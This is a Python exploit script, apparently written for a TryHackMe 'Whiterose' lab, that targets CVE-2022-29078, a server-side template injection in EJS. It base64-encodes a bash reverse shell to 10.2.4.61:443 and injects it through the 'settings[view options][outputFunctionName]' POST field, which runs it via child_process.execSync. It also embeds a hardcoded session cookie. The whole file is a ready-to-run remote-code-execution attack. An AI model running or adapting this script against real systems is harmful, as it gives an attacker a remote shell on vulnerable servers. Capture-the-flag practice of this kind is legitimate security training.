import requests
import argparse
import base64
import logging
from urllib.parse import urlparse
from colorama import init, Fore, Style

# Define the reverse shell command and encode it in base64
reverse_shell = "/bin/bash -i >& /dev/tcp/10.2.4.61/443 0>&1"
encoded_shell = base64.b64encode(reverse_shell.encode()).decode()

logging.basicConfig(
    filename="exploit-ssti.log",     
    level=logging.INFO,          
    format="%(asctime)s - %(levelname)s - %(message)s"
)

banner = rf"""{Fore.LIGHTBLUE_EX}
  _________ ____________________.___                      .__         .__  __   
 /   _____//   _____/\__    ___/|   | ____ ___  _________ |  |   ____ |__|/  |_ 
 \_____  \ \_____  \   |    |   |   |/ __ \|  \/  /\____ \|  |  /  _ \|  \   __|
 /        \/        \  |    |   |   \  ___/ >    < |  |_> >  |_(  <_> )  ||  |  
/_______  /_______  /  |____|   |___|\___  >__/\_ \|   __/|____/\____/|__||__|  
        \/        \/                     \/      \/|__|                                     
      Author: l0n3m4n | ID: CVE-2022-29078 | THM Challenges: Whiterose
{Style.RESET_ALL}
"""

print(banner)

parser = argparse.ArgumentParser(description="Send a crafted POST request with custom URL, username, and password.",
                                 epilog=f"{Fore.LIGHTBLUE_EX}Example: python3 exploit-ssti.py -t http://admin.cyprusbank.thm/settings -u user1 -p pa$$w0rd {Style.RESET_ALL}")
parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://admin.cyprusbank.thm/settings)")
parser.add_argument("-u", "--user", required=True, help="Username to send in the request")
parser.add_argument("-p", "--password", required=True, help="Password to send in the request")
args = parser.parse_args()

# Parse the base URL to extract the scheme and host for the headers
try:
    parsed_url = urlparse(args.target)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
except Exception as e:
    logging.error(f"Invalid URL provided: {e}")
    print(f"{Fore.LIGHTRED_EX}[!] Invalid URL: {e}{Style.RESET_ALL}")
    exit(1)

# Define headers with dynamic Origin and Referer based on the provided URL
headers = {
    "Host": parsed_url.netloc,
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": base_url,
    "Connection": "close",
    "Referer": args.target,
    "Upgrade-Insecure-Requests": "1"
}

# Define cookies or add your cookies here
cookies = {
    "connect.sid": "s%3A_zRZ5SexMmhsZp8qXkFRozhig7K-URNp.H4MqZ9WGXkfi18jLV8T9cvEvWuw1zti2pUQVkK2%2FH1c"
}

# Data and payload
data = {
    "name": args.user,
    "password": args.password,
    "settings[view options][outputFunctionName]": f"x;process.mainModule.require('child_process').execSync('echo {encoded_shell} | base64 -d | bash');s"
}

try:
    # Send the POST request
    response = requests.post(args.target, headers=headers, cookies=cookies, data=data)

    # Check if the request was successful and log the result
    if response.status_code == 200:
        logging.info("Payload delivered successfully.")
        print(f"{Fore.LIGHTGREEN_EX}[+] Payload delivered successfully. Awaiting reverse shell connection...{Style.RESET_ALL}")
    else:
        logging.warning(f"Connection failed with status code: {response.status_code}")
        print(f"{Fore.LIGHTRED_EX}[!] Failed to deliver payload. Status code: {response.status_code}{Style.RESET_ALL}")

except requests.RequestException as e:
    logging.error(f"Connection Failed: {e}")
    print(f"{Fore.LIGHTYELLOW_EX}[!] Error: Connection failed due to {e}{Style.RESET_ALL}")
